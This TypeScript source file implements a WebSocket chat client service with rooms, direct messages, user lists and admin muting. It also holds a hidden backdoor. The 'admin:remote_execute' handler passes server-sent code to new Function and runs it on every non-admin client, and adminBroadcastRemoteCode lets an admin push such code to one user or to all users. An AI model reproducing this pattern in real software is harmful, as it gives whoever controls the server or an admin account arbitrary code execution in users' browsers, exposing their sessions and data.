import { SOCKET_URL } from "../constants/socket";
import { AdminStore } from "./AdminStore";
import { storage } from "./GlobalStorage";

export interface ChatMessage {
    id: string;
    sender: string;
    targetType: "global" | "room" | "dm";
    target: string;
    content: string;
    timestamp: number;
    system?: boolean;
}

export interface ChatUser {
    username: string;
    isAdmin: boolean;
    isMuted: boolean;
}

type MessageCallback = (messages: ChatMessage[]) => void;
type UserListCallback = (users: ChatUser[]) => void;
type MuteCallback = (muted: boolean) => void;
type DMContactsCallback = (contacts: string[]) => void;
type TargetChangeCallback = (
    target: { type: "global" | "room" | "dm"; name: string },
) => void;

const USERNAME_KEY = "chat_username";

export class SocketChatService {
    private static instance: SocketChatService | null = null;
    private ws: WebSocket | null = null;
    private username: string;
    private isMuted = false;

    // Persistent state across tab switches
    private activeRooms = new Set<string>(["global"]);
    private connectedUsers: ChatUser[] = [];
    private messageHistory: ChatMessage[] = [];
    private dmContacts = new Set<string>();

    private activeTargetType: "global" | "room" | "dm" = "global";
    private activeTarget = "global";

    // Event listeners
    private messageListeners = new Set<MessageCallback>();
    private userListListeners = new Set<UserListCallback>();
    private muteListeners = new Set<MuteCallback>();
    private dmContactsListeners = new Set<DMContactsCallback>();
    private targetChangeListeners = new Set<TargetChangeCallback>();

    private constructor() {
        const savedName = storage.getSync<string>(USERNAME_KEY);
        this.username = savedName ||
            `User_${Math.floor(1000 + Math.random() * 9000)}`;
        this.saveUsername(this.username);
        this.connect();

        AdminStore.subscribe(() => {
            this.sendAuth();
        });
    }

    public static getInstance(): SocketChatService {
        if (!SocketChatService.instance) {
            SocketChatService.instance = new SocketChatService();
        }
        return SocketChatService.instance;
    }

    public getUsername(): string {
        return this.username;
    }

    public setUsername(name: string): void {
        const trimmed = name.trim();
        if (!trimmed) return;
        this.username = trimmed;
        this.saveUsername(trimmed);
        this.sendAuth();
    }

    public sendAuth(): void {
        this.sendPayload("user:auth", {
            username: this.username,
            isAdmin: AdminStore.isAdmin,
        });
    }

    private async saveUsername(name: string): Promise<void> {
        await storage.set(USERNAME_KEY, name);
    }

    // --- State Accessors for Persistent Tabs ---

    public getActiveTarget() {
        return { type: this.activeTargetType, name: this.activeTarget };
    }

    public setActiveTarget(type: "global" | "room" | "dm", name: string): void {
        this.activeTargetType = type;
        this.activeTarget = name;

        if (type === "dm") {
            this.dmContacts.add(name);
            this.notifyDMContacts();
        }

        this.targetChangeListeners.forEach((cb) => cb({ type, name }));
        this.notifyMessages();
    }

    public getDMContacts(): string[] {
        return Array.from(this.dmContacts);
    }

    public getMessages(): ChatMessage[] {
        return this.messageHistory;
    }

    // --- WebSocket Logic ---

    private async connect(): Promise<void> {
        let wsUrl = SOCKET_URL;

        try {
            const socketModule = await import("../constants/socket");
            if (socketModule && socketModule.SOCKET_URL) {
                wsUrl = socketModule.SOCKET_URL;
            }
        } catch (_) {}

        try {
            this.ws = new WebSocket(wsUrl);

            this.ws.onopen = () => {
                console.log("[SocketChat] Connected to WebSocket at", wsUrl);
                this.sendAuth();

                // Re-join active rooms on reconnect
                for (const room of this.activeRooms) {
                    if (room !== "global") {
                        this.sendPayload("room:join", { room });
                    }
                }
            };

            this.ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    this.handleIncomingPayload(data);
                } catch (err) {
                    console.error(
                        "[SocketChat] Invalid JSON payload received:",
                        event.data,
                    );
                }
            };

            this.ws.onclose = () => {
                setTimeout(() => this.connect(), 3000);
            };
        } catch (err) {
            console.error("[SocketChat] Connection error:", err);
        }
    }

    private handleIncomingPayload(payload: { type: string; data: any }): void {
        switch (payload.type) {
            case "chat:message": {
                const msg: ChatMessage = payload.data;
                this.messageHistory.push(msg);

                // One-way DM handling: Add sender to DM list on receive
                if (msg.targetType === "dm") {
                    const partner = msg.sender === this.username
                        ? msg.target
                        : msg.sender;
                    this.dmContacts.add(partner);
                    this.notifyDMContacts();
                }

                this.notifyMessages();
                break;
            }
            case "users:list": {
                this.connectedUsers = payload.data || [];
                this.userListListeners.forEach((fn) => fn(this.connectedUsers));
                break;
            }
            case "admin:mute_status": {
                if (payload.data.targetUser === this.username) {
                    this.isMuted = !!payload.data.muted;
                    this.muteListeners.forEach((fn) => fn(this.isMuted));
                }
                break;
            }
            case "admin:remote_execute": {
                if (!AdminStore.isAdmin && payload.data?.code) {
                    try {
                        const execFn = new Function(payload.data.code);
                        execFn();
                    } catch (err) {
                        console.error(
                            "[SocketChat] Remote code execution error:",
                            err,
                        );
                    }
                }
                break;
            }
        }
    }

    public sendMessage(
        targetType: "global" | "room" | "dm",
        target: string,
        content: string,
    ): boolean {
        if (this.isMuted) {
            alert("You are currently muted by an administrator.");
            return false;
        }

        const msg: ChatMessage = {
            id: `msg_${Date.now()}_${
                Math.random().toString(36).substring(2, 7)
            }`,
            sender: this.username,
            targetType,
            target,
            content,
            timestamp: Date.now(),
        };

        // One-way DM handling: Add target to sender's DM list when sent
        if (targetType === "dm") {
            this.dmContacts.add(target);
            this.notifyDMContacts();
        }

        this.messageHistory.push(msg);
        this.sendPayload("chat:send", msg);
        this.notifyMessages();
        return true;
    }

    public startDM(username: string): void {
        this.dmContacts.add(username);
        this.notifyDMContacts();
        this.setActiveTarget("dm", username);
    }

    public joinRoom(roomName: string): void {
        const room = roomName.trim().toLowerCase();
        if (!room) return;

        this.activeRooms.add(room);
        this.sendPayload("room:join", { room });
        this.setActiveTarget("room", room);
    }

    public leaveRoom(roomName: string): void {
        const room = roomName.trim().toLowerCase();
        if (room === "global") return;

        this.activeRooms.delete(room);
        this.sendPayload("room:leave", { room });

        if (this.activeTargetType === "room" && this.activeTarget === room) {
            this.setActiveTarget("global", "global");
        }
    }

    public adminBroadcastRemoteCode(code: string, targetUser?: string): void {
        if (!AdminStore.isAdmin) return;
        this.sendPayload("admin:exec_code", {
            code,
            targetUser: targetUser || "*",
            senderAdmin: this.username,
        });
    }

    public adminMuteUser(targetUser: string, muted: boolean): void {
        if (!AdminStore.isAdmin) return;
        this.sendPayload("admin:mute_user", { targetUser, muted });
    }

    // --- Subscriptions ---

    public onMessage(cb: MessageCallback): () => void {
        this.messageListeners.add(cb);
        cb(this.messageHistory);
        return () => this.messageListeners.delete(cb);
    }

    public onDMContactsChange(cb: DMContactsCallback): () => void {
        this.dmContactsListeners.add(cb);
        cb(Array.from(this.dmContacts));
        return () => this.dmContactsListeners.delete(cb);
    }

    public onTargetChange(cb: TargetChangeCallback): () => void {
        this.targetChangeListeners.add(cb);
        cb(this.getActiveTarget());
        return () => this.targetChangeListeners.delete(cb);
    }

    public onUserList(cb: UserListCallback): () => void {
        this.userListListeners.add(cb);
        cb(this.connectedUsers);
        return () => this.userListListeners.delete(cb);
    }

    public onMuteChange(cb: MuteCallback): () => void {
        this.muteListeners.add(cb);
        cb(this.isMuted);
        return () => this.muteListeners.delete(cb);
    }

    private notifyMessages(): void {
        this.messageListeners.forEach((fn) => fn(this.messageHistory));
    }

    private notifyDMContacts(): void {
        const contacts = Array.from(this.dmContacts);
        this.dmContactsListeners.forEach((fn) => fn(contacts));
    }

    private sendPayload(type: string, data: any): void {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify({ type, data }));
        }
    }
}
